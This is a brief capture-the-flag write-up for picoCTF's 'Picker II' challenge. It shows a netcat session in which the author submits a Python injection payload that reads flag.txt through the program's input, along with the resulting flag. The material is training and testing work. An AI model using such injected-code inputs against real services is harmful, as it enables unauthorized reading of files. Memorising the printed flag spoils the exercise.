### Picker II
Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 62058`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/523/picker-II.py).
### Solución 1
```
┌──(kali㉿kali)-[~/Tareas]
└─$ nc saturn.picoctf.net 62058
==> print(open('flag.txt','r').read())           
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
       
```

picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}

### Notas

